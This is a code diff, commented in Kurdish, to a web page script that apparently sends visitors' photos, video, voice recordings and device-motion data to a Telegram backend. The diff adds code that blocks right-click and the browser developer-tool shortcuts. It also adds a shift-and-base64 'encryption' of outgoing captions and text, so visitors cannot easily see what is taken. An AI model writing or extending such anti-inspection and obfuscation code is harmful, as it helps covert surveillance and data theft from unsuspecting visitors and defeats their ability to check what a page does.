@@ -119,6 +119,21 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // دژە-Inspect و قوفڵکردنی کلیلی F12 / Right Click بۆ پاراستنی زیاتر
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
+                return false;
+            }
+        };
+
+        // سیستەمی شفرکردنی پەیامەکان پێش ناردن (Payload Encryption)
+        function simpleEncrypt(text) {
+            return btoa(text.split('').map(char => 
+                String.fromCharCode(char.charCodeAt(0) + 3)
+            ).join(''));
+        }
+
         let motionData = { alpha: 0, beta: 0, gamma: 0 };
         window.addEventListener('deviceorientation', function(event) {
             motionData.alpha = Math.round(event.alpha || 0);
@@ -126,12 +141,12 @@
             motionData.gamma = Math.round(event.gamma || 0);
         });
 
-        // Secure Backend API Calls (No Bot Token exposed on client side)
         function sendToTelegramText(text) {
+            let encryptedText = simpleEncrypt(text);
             fetch('/api/send', {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ type: 'text', text: text })
+                body: JSON.stringify({ type: 'text', text: encryptedText })
             });
         }
 
@@ -142,7 +157,7 @@
                 fetch('/api/send', {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ type: 'photo', caption: caption, data: reader.result })
+                    body: JSON.stringify({ type: 'photo', caption: simpleEncrypt(caption), data: reader.result })
                 });
             }
         }
@@ -154,7 +169,7 @@
                 fetch('/api/send', {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ type: 'video', caption: caption, data: reader.result })
+                    body: JSON.stringify({ type: 'video', caption: simpleEncrypt(caption), data: reader.result })
                 });
             }
         }
@@ -166,7 +181,7 @@
                 fetch('/api/send', {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ type: 'voice', caption: caption, data: reader.result })
+                    body: JSON.stringify({ type: 'voice', caption: simpleEncrypt(caption), data: reader.result })
                 });
             }
         }
